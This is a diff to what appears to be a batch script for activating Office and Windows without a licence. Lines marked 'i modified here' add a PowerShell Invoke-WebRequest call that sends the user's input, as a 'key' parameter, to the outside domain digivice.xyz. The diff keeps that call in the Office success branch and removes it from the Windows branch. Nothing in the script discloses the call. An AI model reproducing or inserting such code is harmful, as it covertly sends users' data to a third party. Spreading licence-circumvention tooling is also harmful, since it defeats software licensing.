@@ -2086,7 +2086,7 @@ if not defined error (
 
 :: i modified here
 :: hit url to update scripting status
-powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=office&status=complete2089&key=!userInput!')"
+powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=office&status=complete&key=!userInput!')"
 
 
 call :dk_color %Green% "Office is permanently activated."
@@ -5091,11 +5091,6 @@ if %gpr% GTR 259200 if %Win10Gov% EQU 1 set Act_OK=1
 if %gpr% EQU 259200 set Act_OK=1
 
 if %ERRORCODE% EQU 0 if %Act_OK% EQU 1 (
-
-:: i modified here
-:: hit url to update scripting status
-powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=office&status=complete&key=!userInput!')"
-
 call :_color %_Green% "Product Activation Successful"
 echo Remaining Period: %gpr2% days ^(%gpr% minutes^)
 set /a act_attempt=0
